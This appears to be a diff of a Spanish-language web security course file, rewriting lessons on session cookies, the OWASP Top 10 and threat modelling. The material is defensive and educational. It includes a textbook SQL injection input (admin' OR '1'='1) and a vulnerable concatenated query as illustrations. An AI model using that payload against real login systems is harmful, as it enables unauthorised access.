+          Si un atacante obtiene este identificador, ya sea mediante un ataque de secuestro de sesión, mediante XSS, a través de una red comprometida o por exposición involuntaria en una URL, puede utilizarlo para hacerse pasar por el usuario original sin necesidad de conocer la contraseña. Por esta razón, la administración correcta de sesiones es uno de los aspectos más importantes de la seguridad en aplicaciones web. Esto incluye renovar el identificador después del inicio de sesión, invalidarlo al cerrar la sesión, establecer tiempos de expiración claros y asegurarse de que nunca se transmita mediante canales no cifrados.
+        </p>
+
+        <h2>Cookies y atributos de seguridad</h2>
+
+        <p>
+          Las cookies son pequeños archivos que el servidor envía al navegador para almacenar información de manera persistente o semipersistente. Aunque pueden utilizarse para una variedad de fines, su uso más crítico está relacionado con el almacenamiento de identificadores de sesión o tokens de autenticación. Debido a la sensibilidad de esta información, la configuración de una cookie debe hacerse con extremo cuidado.
+        </p>
+
+        <p>
+          Para proteger una cookie, se emplean atributos de seguridad. El atributo <code>HttpOnly</code> evita que el contenido de la cookie sea accesible mediante JavaScript, lo cual reduce el impacto de un ataque de tipo XSS. El atributo <code>Secure</code> permite que la cookie sea enviada únicamente mediante conexiones HTTPS, lo cual evita que se transmita en texto claro. El atributo <code>SameSite</code> restringe si la cookie puede enviarse en solicitudes generadas desde otro dominio. Esta última medida es particularmente importante para prevenir ataques de tipo <code>CSRF</code>, donde un sitio externo induce al navegador de la víctima a enviar solicitudes maliciosas hacia una aplicación autenticada.
+        </p>
+
+        <p>
+          Las cookies pueden ser de sesión o persistentes. Las primeras desaparecen al cerrar el navegador, mientras que las persistentes incluyen una fecha de expiración y permanecen hasta cumplir ese tiempo. En ambos casos, si la cookie almacena información relacionada con autenticación, debe protegerse mediante los atributos mencionados. Un fallo en esta configuración puede permitir que las cookies sean interceptadas, modificadas o reutilizadas por un atacante.
+        </p>
+
+        <h2>Métodos de autenticación utilizados en aplicaciones web</h2>
+
+        <p>
+          La autenticación tiene como finalidad demostrar que un usuario es quien dice ser. En aplicaciones web se emplean diversos métodos para llevar a cabo este proceso, y cada uno tiene implicaciones y riesgos específicos.
+        </p>
+
+        <p>
+          El método más tradicional consiste en la autenticación basada en sesiones. Después de que el usuario proporciona sus credenciales, el servidor las valida y genera un identificador de sesión. Esta identificación se almacena en una cookie y se envía con cada solicitud para demostrar que el usuario ya se ha autenticado anteriormente. Esta técnica es simple y muy utilizada en aplicaciones estructuradas bajo arquitecturas clásicas. Sin embargo, si la cookie es robada, el atacante obtiene acceso inmediato.
+        </p>
+
+        <p>
+          Las aplicaciones modernas utilizan frecuentemente autenticación mediante tokens, en especial tokens <code>JWT</code>. Estos tokens incluyen información firmada digitalmente que puede ser validada por el servidor sin necesidad de mantener información de estado. Aunque esto facilita la escalabilidad, también introduce riesgos importantes. Un token <code>JWT</code> robado permanece válido hasta que expire. Si la aplicación almacena estos tokens en localStorage u otros espacios accesibles desde JavaScript, el riesgo de exposición ante un ataque XSS aumenta considerablemente.
+        </p>
+
+        <p>
+          Finalmente, existen métodos como OAuth 2.0, que permiten a la aplicación delegar el proceso de autenticación a un proveedor externo. Este mecanismo reduce la necesidad de gestionar contraseñas, pero requiere controles estrictos sobre los dominios de redirección y la validez de los tokens emitidos. Una mala implementación puede permitir el secuestro del flujo de autenticación y el robo de tokens de acceso.
+        </p>
+
+        <h2>Bibliografía</h2>
+
+        <ul>
+          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Indianapolis, IN, USA: Wiley Publishing, 2011.</li>
+
+          <li>OWASP Foundation, Session Management Cheat Sheet. [Online]. Available:
+            <a href="https://owasp.org/www-project-cheat-sheets/cheatsheets/Session_Management_Cheat_Sheet.html" target="_blank">
+              https://owasp.org/www-project-cheat-sheets/cheatsheets/Session_Management_Cheat_Sheet.html
+            </a>
+          </li>
+
+          <li>OWASP Foundation, Authentication Cheat Sheet. [Online]. Available:
+            <a href="https://owasp.org/www-project-cheat-sheets/cheatsheets/Authentication_Cheat_Sheet.html" target="_blank">
+              https://owasp.org/www-project-cheat-sheets/cheatsheets/Authentication_Cheat_Sheet.html
+            </a>
+          </li>
+
+          <li>M. Zalewski, <i>The Tangled Web: A Guide to Securing Modern Web Applications</i>. San Francisco, CA, USA: No Starch Press, 2012.</li>
+
+          <li>Mozilla Developer Network, HTTP Overview. [Online]. Available:
+            <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview" target="_blank">
+              https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview
+            </a>
+          </li>
+        </ul>
+    `
     },
     'owasp-top-10': {
       id: 'owasp-top-10',
       title: 'OWASP Top 10',
-      description: 'Conoce las diez vulnerabilidades más críticas según OWASP, su impacto en la seguridad de las aplicaciones web y las estrategias modernas para mitigarlas.',
+      description: 'Las vulnerabilidades más críticas según OWASP.',
+      category: 'security-basics',
+      htmlContent:`
+              <p>
+          OWASP Top 10 es una referencia ampliamente utilizada en la industria para comprender las vulnerabilidades más críticas en aplicaciones web. Su propósito es generar conciencia sobre los riesgos más frecuentes, explicar cómo ocurren estas fallas y promover prácticas que reduzcan de manera significativa la superficie de ataque. Aunque no es un estándar obligatorio, muchas organizaciones lo adoptan como guía fundamental para auditorías, desarrollo seguro y análisis de riesgos.
+        </p>
+
+        <p>
+          El listado se actualiza periódicamente para reflejar cómo evolucionan las amenazas y las técnicas de ataque. En cada edición se revisan millones de incidentes, reportes comunitarios y estudios especializados para identificar qué vulnerabilidades representan el mayor riesgo práctico en el panorama real de la seguridad web. Esto convierte a OWASP Top 10 en un mapa actualizado del comportamiento de los atacantes y de los errores más comunes que persisten en aplicaciones modernas. El top 10 se describe a continuación:
+        </p>
+
+        <h2>1. Control inadecuado del acceso</h2>
+
+        <p>
+          El control de acceso insuficiente es una de las vulnerabilidades más frecuentes y de mayor impacto. Este problema ocurre cuando la aplicación permite a un usuario realizar acciones o acceder a recursos para los cuales no tiene permisos legítimos. El error suele originarse en la falta de validación del lado del servidor, donde se confía en parámetros enviados desde el cliente para determinar qué contenido debe mostrarse o qué operaciones están autorizadas.
+        </p>
+
+        <p>
+          Un ejemplo típico aparece cuando la aplicación recibe un identificador enviado por el usuario y lo utiliza para recuperar información sin comprobar si pertenece al usuario autenticado. Si un atacante manipula la solicitud y reemplaza ese identificador con el de otra persona, puede acceder a información ajena o ejecutar acciones en nombre de terceros. Este tipo de falla permite escalación horizontal o vertical de privilegios y afecta directamente la integridad de la lógica interna del sistema.
+        </p>
+
+        <h2>2. Fallas criptográficas</h2>
+
+        <p>
+          Las fallas criptográficas abarcan errores relacionados con el manejo inadecuado de la información sensible, especialmente cuando se trata de contraseñas, números de tarjetas o datos personales. Estas fallas suelen ocurrir cuando la aplicación almacena información sin cifrar, utiliza algoritmos desactualizados, transmite datos sin protección o aplica un cifrado incorrecto para la confidencialidad requerida.
+        </p>
+
+        <p>
+          Un ejemplo común es almacenar contraseñas en texto plano o utilizando algoritmos débiles como MD5. En caso de una brecha, un atacante puede recuperar las contraseñas sin mayor esfuerzo. De manera similar, transmitir información por HTTP en lugar de HTTPS expone todos los datos al riesgo de interceptación. La correcta implementación de cifrado requiere algoritmos modernos, manejo adecuado de claves, sal aleatoria y mecanismos que aseguren integridad y confidencialidad.
+        </p>
+
+        <h2>3. Inyección</h2>
+
+        <p>
+          Las vulnerabilidades de inyección se presentan cuando un atacante inserta datos no confiables que alteran la estructura o comportamiento de una instrucción interpretada por el servidor. Entre los tipos más conocidos se encuentran la inyección SQL, la inyección de comandos y la inyección LDAP. El origen del problema es la falta de validación adecuada en entradas que son combinadas directamente con instrucciones internas.
+        </p>
+
+        <p>
+          Un ejemplo clásico de inyección SQL aparece cuando el código genera consultas concatenando valores proporcionados por el usuario:
+        </p>
+
+        <pre><code>"SELECT * FROM usuarios WHERE nombre = '" + entrada + "'"</code></pre>
+
+        <p>
+          Si el atacante envía una cadena especialmente diseñada, puede modificar la consulta original. Para prevenir estas fallas, se emplean consultas preparadas, validación estricta y separación entre datos y comandos.
+        </p>
+
+        <h2>4. Diseño inseguro</h2>
+
+        <p>
+          El diseño inseguro se refiere a la ausencia de decisiones de arquitectura que consideren la seguridad desde el inicio. No se trata de fallas de implementación específicas, sino de estructuras o procesos que permiten comportamientos inseguros. Esto incluye flujos de autenticación débiles, ausencia de controles para operaciones críticas, falta de mecanismos antifraude o dependencias entre componentes que exponen información o funcionalidad interna.
+        </p>
+
+        <p>
+          Un sistema que permite cambios de contraseña sin verificar la identidad del usuario, o una API que no limita intentos de autenticación, ejemplifica este tipo de problema. En estos casos, incluso si el código está escrito correctamente, la arquitectura general permite ataques debido a omisiones conceptuales en el diseño original.
+        </p>
+
+        <h2>5. Configuración incorrecta de seguridad</h2>
+
+        <p>
+          La configuración incorrecta es una de las causas más comunes de incidentes. Aparece cuando los servidores, bases de datos, frameworks o servicios externos se encuentran con configuraciones por defecto, características innecesarias habilitadas, versiones obsoletas o permisos excesivos. Estos errores suelen generar puntos de exposición que los atacantes pueden descubrir con herramientas automatizadas.
+        </p>
+
+        <p>
+          Un caso habitual es un panel administrativo expuesto sin restricciones adicionales, o un servidor que muestra mensajes de error detallados que revelan rutas internas, estructuras de archivos o tecnologías utilizadas. La administración adecuada de configuraciones requiere inventarios completos, eliminación de componentes innecesarios, actualización continua y revisión periódica de permisos.
+        </p>
+
+        <h2>6. Vulnerabilidades en componentes externos</h2>
+
+        <p>
+          Las aplicaciones modernas dependen de bibliotecas, paquetes, servicios remotos y frameworks desarrollados por terceros. Cuando alguno de estos componentes contiene una vulnerabilidad, la aplicación adopta ese riesgo automáticamente. Este tipo de fallo se convierte en un vector crítico cuando el componente comprometido se encuentra en una parte central del sistema.
+        </p>
+
+        <p>
+          Un escenario típico ocurre cuando una aplicación utiliza una versión vulnerable de una biblioteca de autenticación o un framework de plantillas que permite la ejecución remota de código. Los atacantes suelen buscar versiones desactualizadas e intentar explotarlas incluso si el código propio de la aplicación no contiene fallas. La gestión de dependencias requiere inventarios, monitoreo de avisos de seguridad y actualización continua.
+        </p>
+
+        <h2>7. Fallas de identificación y autenticación</h2>
+
+        <p>
+          Los problemas en la autenticación y en la verificación de identidad ocurren cuando la aplicación permite eludir controles que deberían restringir el acceso. Esto se presenta en inicios de sesión mal diseñados, reenvíos de tokens sin validación, reutilización de credenciales, recuperación insegura de contraseñas y fallas al verificar firmas en tokens o sesiones.
+        </p>
+
+        <p>
+          Un ejemplo claro corresponde a sistemas que aceptan contraseñas débiles, no limitan intentos de autenticación o no invalidan sesiones antiguas. También es frecuente que una API acepte tokens sin verificar la firma o que no implementen expiraciones adecuadas. Estos errores permiten que atacantes obtengan acceso sin requerir técnicas avanzadas.
+        </p>
+
+        <h2>8. Fallas en el control de integridad de software y datos</h2>
+
+        <p>
+          La integridad garantiza que los datos y el código no han sido modificados de manera no autorizada. Cuando una aplicación confía en entradas externas, archivos cargados por el usuario o dependencias que provienen de repositorios remotos sin validación, se expone a ataques que modifican datos o introducen contenido malicioso.
+        </p>
+
+        <p>
+          Un caso común ocurre cuando el sistema permite cargar archivos sin validar su firma, tipo o contenido. Si el atacante sube un archivo ejecutable camuflado como imagen, es posible que logre ejecutar instrucciones en el servidor. También ocurre cuando la aplicación descarga scripts externos sin verificar su origen, permitiendo ataques en la cadena de suministro.
+        </p>
+
+        <h2>9. Fallas en la monitorización y registro</h2>
+
+        <p>
+          La falta de monitoreo adecuado impide detectar actividades sospechosas o responder rápidamente a incidentes. Cuando la aplicación no registra intentos de acceso, errores de autenticación o acciones críticas, es difícil realizar investigaciones posteriores o identificar patrones de ataque.
+        </p>
+
+        <p>
+          Un ejemplo ocurre cuando un atacante prueba cientos de combinaciones de credenciales y la aplicación no registra estas solicitudes. Sin un sistema de registro adecuado, la organización no puede activar mecanismos de defensa, como bloqueo de IP o alertas internas. El monitoreo constante es esencial para detectar comportamientos anómalos y responder oportunamente.
+        </p>
+
+        <h2>10. Falsificación de solicitudes del lado del servidor</h2>
+
+        <p>
+          Este tipo de vulnerabilidad aparece cuando la aplicación permite que el servidor realice solicitudes arbitrarias basadas en parámetros proporcionados por el usuario. Un atacante puede utilizar este comportamiento para acceder a recursos internos, interactuar con servicios restringidos o enviar solicitudes a redes que no están expuestas públicamente.
+        </p>
+
+        <p>
+          Un escenario típico ocurre cuando una aplicación permite que el usuario proporcione una URL para descargar contenido y el servidor intenta obtenerlo directamente. Si no existe validación, el atacante puede enviar direcciones internas, como solicitudes hacia bases de datos, servicios de administración o endpoints sensibles, utilizando al servidor como intermediario para realizar acciones no autorizadas.
+        </p>
+
+        <h2>Bibliografía</h2>
+        <ul>
+          <li>OWASP Foundation, OWASP Top Ten 2021. [Online]. Available:
+            <a href="https://owasp.org/Top10" target="_blank">
+              https://owasp.org/Top10
+            </a>
+          </li>
+
+          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Indianapolis, IN, USA: Wiley Publishing, 2011.</li>
+
+          <li>OWASP Foundation, Web Security Testing Guide. [Online]. Available:
+            <a href="https://owasp.org/www-project-web-security-testing-guide" target="_blank">
+              https://owasp.org/www-project-web-security-testing-guide
+            </a>
+          </li>
+
+          <li>National Institute of Standards and Technology, Secure Software Development Framework. [Online]. Available:
+            <a href="https://csrc.nist.gov" target="_blank">
+              https://csrc.nist.gov
+            </a>
+          </li>
+
+          <li>ENISA, Threat Landscape 2023. [Online]. Available:
+            <a href="https://www.enisa.europa.eu" target="_blank">
+              https://www.enisa.europa.eu
+            </a>
+          </li>
+        </ul>
+      `
+    },
+    'modelo-amenazas-vectores': {
+      id: 'modelo-amenazas-vectores',
+      title: 'Modelo de amenazas y vectores de ataque frecuentes',
+      description: 'Cómo se identifican y clasifican las amenazas en la web.',
       category: 'security-basics',
       htmlContent: `
-      <h2>Introducción</h2>
-      <p>
-      El OWASP Top 10 es un proyecto mantenido por la Open Web Application Security Project, una comunidad global dedicada a mejorar la seguridad del software. Desde hace más de una década, el Top 10 se ha convertido en el estándar de facto para identificar las principales vulnerabilidades en aplicaciones web. No es simplemente una lista, sino una guía educativa que refleja las amenazas más comunes y graves observadas en miles de auditorías, pruebas de penetración y datos reales de incidentes de seguridad.
-      </p>
-      <p>
-      Comprender cada categoría del OWASP Top 10 es esencial para cualquier profesional de desarrollo, seguridad o auditoría. Estas vulnerabilidades representan los errores más repetidos en la industria y sirven como punto de partida para establecer políticas, realizar revisiones de código y diseñar arquitecturas seguras.
-      </p>
+        <p>
+          El modelo de amenazas es una metodología que permite identificar, clasificar y comprender los riesgos que enfrenta una aplicación web antes, durante y después de su operación. Su propósito es determinar qué actores podrían atacar el sistema, qué objetivos persiguen, qué activos buscan comprometer y qué vectores podrían utilizar para lograrlo. Elaborar un modelo de amenazas es un paso fundamental en la arquitectura segura, ya que proporciona una visión sistemática de los puntos donde la aplicación es vulnerable y facilita la implementación de controles adecuados para reducir el riesgo.
+        </p>
 
-      <h2>Visión General del OWASP Top 10 (versión 2021)</h2>
-      <p>
-      La edición 2021 reagrupa algunas categorías, introduce nuevas (como “Software and Data Integrity Failures”) y refleja una visión más holística que abarca tanto defectos técnicos como fallas de diseño y gestión. A continuación se detalla cada una:
-      </p>
+        <p>
+          Cuando se evalúa una aplicación web, se analizan aspectos como la superficie de exposición, la forma en que se manejan los datos sensibles, los componentes externos que participan en el flujo de información y los caminos técnicos que un atacante podría aprovechar para manipular solicitudes, falsificar identidades o extraer información. Este análisis no se limita a escenarios extremadamente avanzados; incluso un atacante con conocimientos básicos puede explotar errores simples en la validación de entradas, en la gestión de sesiones o en la configuración del servidor para tomar control parcial o total del sistema.
+        </p>
 
-      <h3>1. Broken Access Control (Control de acceso roto)</h3>
-      <p>
-      Se refiere a errores en la implementación de permisos, roles o restricciones de acceso. Un atacante puede acceder a datos o funciones que no debería. Ejemplos:
-      </p>
-      <ul>
-        <li>Endpoints administrativos accesibles sin autenticación.</li>
-        <li>Usuarios que pueden modificar parámetros (como <code>user_id</code>) y ver o alterar información de otros.</li>
-      </ul>
-      <p>
-      <strong>Mitigación:</strong> aplicar control de acceso a nivel de servidor, verificar permisos en cada solicitud, usar frameworks con gestión centralizada de roles, y nunca confiar en el cliente para la autorización.
-      </p>
+        <p>
+          El objetivo principal de un modelo de amenazas es hacer visible aquello que un atacante vería. Identificar estas áreas antes de que ocurran incidentes permite implementar defensas específicas en la arquitectura, en el código y en las configuraciones.
+        </p>
 
-      <h3>2. Cryptographic Failures (Fallas criptográficas)</h3>
-      <p>
-      Anteriormente conocida como “Sensitive Data Exposure”. Ocurre cuando datos sensibles no se cifran correctamente, se usan algoritmos débiles o se transmiten sin TLS. Ejemplos:
-      </p>
-      <ul>
-        <li>Contraseñas almacenadas en texto plano o con hash MD5.</li>
-        <li>Tráfico HTTP sin HTTPS.</li>
-      </ul>
-      <p>
-      <strong>Mitigación:</strong> usar algoritmos fuertes (AES-256, bcrypt, Argon2), TLS 1.2 o superior, rotación de claves y cifrado de datos en tránsito y en reposo.
-      </p>
+        <h2>Actores de amenaza y sus motivaciones</h2>
 
-      <h3>3. Injection (Inyección)</h3>
-      <p>
-      Engloba inyecciones SQL, NoSQL, LDAP, OS Command, etc. Ocurre cuando datos del usuario se interpretan como parte del código o comando. La inyección SQL es la más conocida y peligrosa: puede exponer, modificar o destruir toda la base de datos.
-      </p>
-      <p>
-      <strong>Mitigación:</strong> usar consultas parametrizadas, validaciones estrictas y escapar adecuadamente caracteres especiales. Nunca concatenar directamente entrada del usuario en comandos.
-      </p>
+        <p>
+          Los actores que representan un riesgo para una aplicación pueden ser muy distintos entre sí. Los más comunes incluyen atacantes externos que buscan vulnerar la aplicación desde internet para obtener información o causar daño. También existen atacantes internos que, aprovechando acceso legítimo, ejecutan acciones no autorizadas. Finalmente, existen actores automatizados, como bots y escáneres, que rastrean aplicaciones en busca de fallos conocidos que explotar de manera masiva.
+        </p>
 
-      <h3>4. Insecure Design (Diseño inseguro)</h3>
-      <p>
-      No se trata de bugs de código, sino de fallas en la lógica del sistema. Por ejemplo:
-      </p>
-      <ul>
-        <li>Un flujo de pago que no valida límites de transacción.</li>
-        <li>Una API que asume que los usuarios nunca manipularán parámetros críticos.</li>
-      </ul>
-      <p>
-      <strong>Mitigación:</strong> aplicar “Security by Design”, realizar threat modeling en el diseño, establecer controles de defensa en profundidad y revisiones arquitectónicas de seguridad.
-      </p>
+        <p>
+          Las motivaciones varían desde intereses económicos, acceso a información confidencial, obtención de control sobre recursos del servidor, interrupción del servicio o incluso uso de la aplicación como punto de entrada a redes más amplias. Comprender quién podría atacar la aplicación y por qué permite priorizar mejor los controles de seguridad.
+        </p>
 
-      <h3>5. Security Misconfiguration (Configuración de seguridad incorrecta)</h3>
-      <p>
-      Es la causa más común de vulnerabilidades web. Incluye servidores con configuraciones por defecto, paneles de administración expuestos o cabeceras HTTP ausentes.
-      </p>
-      <ul>
-        <li>Ejemplo: panel de administración Tomcat sin contraseña.</li>
-        <li>Ejemplo: cabecera <code>X-Frame-Options</code> faltante que permite clickjacking.</li>
-      </ul>
-      <p>
-      <strong>Mitigación:</strong> automatizar configuraciones seguras, aplicar hardening en servidores y contenedores, revisar periódicamente entornos, y eliminar servicios innecesarios.
-      </p>
+        <h2>Vectores de ataque relacionados con la entrada de datos</h2>
 
-      <h3>6. Vulnerable and Outdated Components</h3>
-      <p>
-      Usar librerías, frameworks o dependencias con fallas conocidas. Un solo componente vulnerable puede comprometer toda la aplicación. Ejemplo: versiones viejas de Log4j o jQuery con fallos de XSS.
-      </p>
-      <p>
-      <strong>Mitigación:</strong> mantener inventario de dependencias, usar escáneres de vulnerabilidades (Dependabot, OWASP Dependency-Check), aplicar actualizaciones de seguridad regularmente.
-      </p>
+        <p>
+          Uno de los vectores más comunes y peligrosos es la manipulación de datos de entrada. Cualquier campo que reciba información del usuario, ya provenga de formularios, parámetros en la URL, encabezados HTTP o archivos cargados, constituye un punto de exposición. La validación insuficiente de estos datos permite que los atacantes introduzcan instrucciones inesperadas o alteren la lógica interna del sistema.
+        </p>
 
-      <h3>7. Identification and Authentication Failures</h3>
-      <p>
-      Antes conocido como “Broken Authentication”. Se refiere a fallas que permiten suplantación de identidad, robo de sesiones o bypass de login. Ejemplos:
-      </p>
-      <ul>
-        <li>Sesiones sin expiración o sin regeneración tras autenticación.</li>
-        <li>Tokens JWT sin firma o con algoritmos inseguros.</li>
-      </ul>
-      <p>
-      <strong>Mitigación:</strong> usar frameworks con autenticación segura integrada, gestionar sesiones con cookies HttpOnly y Secure, aplicar MFA y almacenar hashes de contraseñas robustos.
-      </p>
+        <p>
+          Un ejemplo de este tipo de vector aparece en el siguiente escenario típico. Supongamos que una aplicación recibe un parámetro llamado <strong>usuario</strong> para autenticar al cliente. Si este parámetro se utiliza directamente en una consulta SQL sin validación, un atacante podría enviar una entrada como la siguiente:
+        </p>
 
-      <h3>8. Software and Data Integrity Failures</h3>
-      <p>
-      Categoría nueva en OWASP 2021. Ocurre cuando se confía en código o datos sin verificar su integridad. Ejemplo: actualización automática desde repositorio remoto sin firma, o uso de objetos serializados manipulables.
-      </p>
-      <p>
-      <strong>Mitigación:</strong> verificar firmas digitales, usar CI/CD seguro, aplicar control de integridad (checksums) y evitar deserialización insegura.
-      </p>
+        <pre><code>admin' OR '1'='1</code></pre>
 
-      <h3>9. Security Logging and Monitoring Failures</h3>
-      <p>
-      Sin registro ni monitoreo, los ataques pasan inadvertidos. Las fallas incluyen logs incompletos, sin timestamps, o no revisados. Esto impide detectar SQLi, accesos sospechosos o ataques automatizados.
-      </p>
-      <p>
-      <strong>Mitigación:</strong> generar logs consistentes, centralizados y auditables, usar SIEM (como Splunk, ELK, o Wazuh), y establecer alertas por comportamientos anómalos.
-      </p>
+        <p>
+          Si el código vulnerable construye dinámicamente la cadena SQL, esa entrada puede modificar el comportamiento previsto y devolver acceso indebido. Este tipo de manipulación es la base de ataques como inyección SQL, inyección LDAP, inyección de comandos y otros ataques similares que afectan sistemas mal protegidos.
+        </p>
 
-      <h3>10. Server-Side Request Forgery (SSRF)</h3>
-      <p>
-      SSRF ocurre cuando una aplicación permite que el usuario controle una URL o destino que el servidor luego solicita. Esto puede usarse para acceder a recursos internos (por ejemplo, metadatos de nube o APIs internas).
-      </p>
-      <ul>
-        <li>Ejemplo: formulario que permite subir una URL, y el servidor la “descarga” sin validar, pudiendo acceder a <code>http://169.254.169.254</code> (AWS metadata service).</li>
-      </ul>
-      <p>
-      <strong>Mitigación:</strong> validar y restringir URLs (listas blancas), bloquear acceso a redes internas, y usar servicios proxy o sandbox para solicitudes externas.
-      </p>
+        <h2>Vectores de ataque asociados al manejo del estado</h2>
 
-      <h2>Ejemplos Reales de Impacto</h2>
-      <ul>
-        <li><strong>Equifax (2017):</strong> Vulnerabilidad de inyección (Apache Struts) permitió acceso a datos de 143 millones de personas.</li>
-        <li><strong>Yahoo (2014):</strong> SQLi expuso 500 millones de cuentas, derivando en sanciones y pérdida de reputación.</li>
-        <li><strong>Capital One (2019):</strong> SSRF permitió a un atacante acceder a buckets S3 con datos sensibles.</li>
-      </ul>
+        <p>
+          La gestión del estado, especialmente a través de sesiones y cookies, también representa un vector crítico de ataque. Si una aplicación conserva el Session ID en una cookie sin atributos de seguridad o si el servidor no invalida correctamente las sesiones caducadas, un atacante podría interceptar o reutilizar ese identificador para suplantar al usuario original.
+        </p>
 
-      <h2>Errores Comunes</h2>
-      <ul>
-        <li>Enfocar seguridad solo en la capa de aplicación, ignorando configuración e infraestructura.</li>
-        <li>Creer que usar un framework moderno elimina los riesgos automáticamente.</li>
-        <li>No priorizar actualizaciones de librerías por miedo a romper compatibilidad.</li>
-        <li>No integrar escáneres de vulnerabilidades en el ciclo de desarrollo.</li>
-        <li>Ignorar logs o no responder a alertas de seguridad hasta que ya es tarde.</li>
-      </ul>
+        <p>
+          Un ejemplo simplificado que ilustra este riesgo es el siguiente. Si una cookie contiene un identificador como:
+        </p>
 
-      <h2>Buenas Prácticas Generales</h2>
-      <ul>
-        <li>Adoptar <strong>DevSecOps</strong>: integrar controles de seguridad en CI/CD (SAST, DAST, SCA).</li>
-        <li>Realizar <strong>Threat Modeling</strong> periódico para detectar riesgos de diseño antes de escribir código.</li>
-        <li>Actualizar continuamente dependencias, frameworks y motores de base de datos.</li>
-        <li>Usar <strong>cheat sheets OWASP</strong> por tipo de vulnerabilidad (SQLi, XSS, Auth, etc.) como guías de referencia práctica.</li>
-        <li>Implementar políticas de seguridad en cabeceras HTTP: CSP, X-Frame-Options, X-XSS-Protection, etc.</li>
-      </ul>
+        <pre><code>Set-Cookie: session_id=XYZ123</code></pre>
 
-      <h2>Resumen</h2>
-      <p>
-      El OWASP Top 10 proporciona una visión priorizada de los riesgos más críticos en aplicaciones web. Aunque la lista cambia con el tiempo, su esencia se mantiene: la mayoría de las brechas ocurren por errores conocidos, mal entendidos o ignorados. Cada categoría representa un área donde se cruzan el diseño, la implementación y la operación. Conocerlas permite a equipos técnicos anticipar vulnerabilidades, a equipos de gestión priorizar esfuerzos y a organizaciones reducir drásticamente su superficie de ataque.
-      </p>
-      <p>
-      Comprender el OWASP Top 10 es el paso esencial para cualquier estrategia de seguridad madura: es la base para construir software resiliente, verificable y alineado con los estándares internacionales de ciberseguridad.
-      </p>
-      `
+        <p>
+          pero carece de los atributos <code>Secure</code> o <code>HttpOnly</code>, un atacante que capture tráfico en una red abierta puede obtenerla sin mayores dificultades y reutilizarla para enviar solicitudes autenticadas. Este tipo de vulnerabilidad es especialmente grave en arquitecturas que dependen exclusivamente de la cookie para gestionar permisos.
+        </p>
+
+        <p>
+          Además, las aplicaciones pueden ser vulnerables a ataques de fijación de sesión cuando permiten que un atacante defina previamente el identificador que usará la víctima. Esto ocurre cuando la aplicación no genera un nuevo Session ID después del inicio de sesión, permitiendo que el atacante controle la sesión resultante.
+        </p>
+
+        <h2>Vectores relacionados con la lógica de la aplicación</h2>
+
+        <p>
+          Más allá de las fallas técnicas en validación o configuración, muchos ataques se basan en errores en la lógica de negocio y en la secuencia de pasos que debe seguir un usuario. Un ejemplo común se presenta cuando una aplicación permite realizar una operación crítica sin verificar que el usuario tenga permiso para ello. Esto suele ocurrir cuando se confía únicamente en el contenido visible del cliente o cuando el servidor no valida que la acción corresponda al usuario autenticado.
+        </p>
+
+        <p>
+          Considere el siguiente ejemplo realista. Una aplicación permite a un usuario actualizar su perfil mediante una solicitud <code>POST</code> hacia una ruta como:
+        </p>
+
+        <pre><code>POST /actualizar_perfil</code></pre>
+
+        <p>
+          Si la aplicación solo revisa el identificador enviado en el cuerpo del formulario y no verifica la identidad del usuario en sesión, un atacante podría enviar una solicitud manipulada estableciendo el ID de otra persona, alterando así información de terceros sin autorización.
+        </p>
+
+        <p>
+          Este tipo de fallas se manifiesta en vulnerabilidades como escalación horizontal de privilegios, manipulación de parámetros o ejecución de acciones sin autorización adecuada.
+        </p>
+
+        <h2>Vectores de ataque derivados de la configuración y la infraestructura</h2>
+
+        <p>
+          Una aplicación puede ser segura a nivel de código pero vulnerable por errores en su infraestructura o configuración. Servidores que revelan versiones exactas del software, bases de datos expuestas sin autenticación o componentes desactualizados son puntos de entrada frecuentes.
+        </p>
+
+        <p>
+          Un ejemplo representativo ocurre cuando un servidor expone un panel de administración sin mecanismos adicionales de protección. Una ruta predecible como:
+        </p>
+
+        <pre><code>http://servidor.com/admin</code></pre>
+
+        <p>
+          puede ser descubierta mediante exploración automatizada. Si la aplicación no implementa controles como autenticación multifactor, restricciones de IP o renombre del panel, el atacante obtiene un acceso privilegiado de manera inmediata si logra descubrir credenciales débiles o reutilizadas.
+        </p>
+
+        <p>
+          Las vulnerabilidades derivadas de configuraciones erróneas incluyen también el uso incorrecto de permisos en archivos, servicios expuestos sin requerir cifrado o mecanismos que revelan información sensible en mensajes de error. Estos problemas no siempre son evidentes durante el desarrollo, por lo que deben revisarse sistemáticamente mediante pruebas de seguridad y auditorías.
+        </p>
+
+        <h2>Vectores relacionados con terceros y componentes externos</h2>
+
+        <p>
+          Muchas aplicaciones modernas dependen de librerías, servicios en la nube, plataformas de autenticación o integraciones con sistemas de terceros. Aunque estas dependencias facilitan el desarrollo, también introducen riesgos adicionales. Cualquier componente externo puede contener vulnerabilidades que afectan la seguridad de toda la aplicación.
+        </p>
+
+        <p>
+          Los ataques a la cadena de suministro se originan cuando un proveedor o componente confiable es comprometido. Al actualizar una librería desde un repositorio público o al integrar un script remoto, la aplicación hereda las vulnerabilidades presentes en ese recurso. Esto ocurrió en numerosos incidentes donde paquetes populares fueron infectados para distribuir código malicioso que se ejecutaba automáticamente al ser incorporado por los desarrolladores.
+        </p>
+
+        <p>
+          Incluso en casos menos severos, depender de versiones desactualizadas o no aplicar parches representa un vector frecuente de ataque que los adversarios aprovechan mediante escaneos automatizados.
+        </p>
+
+        <h2>Bibliografía</h2>
+        <ul>
+          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Indianapolis, IN, USA: Wiley Publishing, 2011.</li>
+
+          <li>OWASP Foundation, Threat Modeling Cheat Sheet. [Online]. Available:
+            <a href="https://owasp.org/www-project-cheat-sheets/cheatsheets/Threat_Modeling_Cheat_Sheet.html" target="_blank">
+              https://owasp.org/www-project-cheat-sheets/cheatsheets/Threat_Modeling_Cheat_Sheet.html
+            </a>
+          </li>
+
+          <li>OWASP Foundation, Top 10 Web Application Security Risks. [Online]. Available:
+            <a href="https://owasp.org/Top10" target="_blank">
+              https://owasp.org/Top10
+            </a>
+          </li>
+
+          <li>Microsoft Security Response Center, Introduction to Threat Modeling. [Online]. Available:
+            <a href="https://learn.microsoft.com/en-us/security/compass/threat-modeling" target="_blank">
+              https://learn.microsoft.com/en-us/security/compass/threat-modeling
+            </a>
+          </li>
+
